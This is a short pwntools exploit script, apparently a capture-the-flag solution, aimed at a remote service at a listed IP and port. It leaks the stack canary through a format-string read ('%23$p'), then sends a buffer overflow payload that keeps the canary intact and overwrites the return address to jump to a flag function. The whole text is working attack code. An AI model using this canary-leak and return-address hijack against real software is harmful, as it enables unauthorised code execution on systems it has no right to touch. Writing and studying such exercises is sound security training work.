from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('111.200.241.244', 51303)
io.sendlineafter(b'3. Exit the battle', b'2')
io.sendline(b'%23$p')
io.recvuntil(b'0x')
canary = int(io.recv(16), 16)
flag_addr = 0x4008da
io.sendlineafter(b'3. Exit the battle', b'1')
payload = b'a'*0x88 + p64(canary) + b'a'*8 + p64(flag_addr)
io.sendline(payload)
io.interactive()